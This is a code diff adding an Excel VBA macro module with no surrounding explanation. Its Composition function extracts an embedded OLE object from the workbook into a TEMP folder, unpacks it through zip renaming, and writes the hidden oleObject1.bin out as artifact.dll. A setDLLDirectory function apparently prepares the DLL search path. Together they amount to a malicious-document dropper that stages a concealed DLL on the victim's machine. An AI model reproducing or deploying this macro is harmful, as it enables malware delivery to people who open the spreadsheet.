@@ -1,0 +1,54 @@
+Public Function setDLLDirectory(ByVal targetDir As String)
+
+    Dim b As Byte
+    Dim p As Long
+     
+     code2 (&H1000)
+     code1 (StrConv(targetDir, vbUnicode))
+End Function
+
+Public Function Composition()
+
+Dim fso As New FileSystemObject
+Dim shlApp As Object
+
+Sheet1.OLEObjects("Object 1").Copy
+
+outPath = Environ$("TEMP") + "\out\"
+
+If Not fso.FolderExists(outPath) Then
+    fso.CreateFolder outPath
+End If
+
+CreateObject("Shell.Application") _
+    .Namespace(outPath) _
+    .Self.InvokeVerb "Paste"
+
+Set Folder = fso.GetFolder(Environ$("TEMP") + "\out\")
+
+For Each File In Folder.Files
+    If InStr(File, ".zip") Then
+        fname = File.Name
+    End If
+Next File
+
+removedExt = Split(fname, ".")
+zippedFname = outPath + removedExt(0) + ".zip"
+objBin = "xl\embeddings\oleObject1.bin"
+
+Set shlApp = CreateObject("Shell.Application")
+shlApp.Namespace(outPath).CopyHere shlApp.Namespace(zippedFname).Items
+
+Kill (zippedFname)
+
+xlsx = outPath + removedExt(0) + ".xlsx"
+FileCopy Source:=xlsx, Destination:=zippedFname
+
+Kill (xlsx)
+shlApp.Namespace(outPath).CopyHere shlApp.Namespace(zippedFname).Items.Item(objBin)
+
+objBin1 = outPath + "\oleObject1.bin"
+dll = outPath + "\artifact.dll"
+FileCopy Source:=objBin1, Destination:=dll
+
+End Function
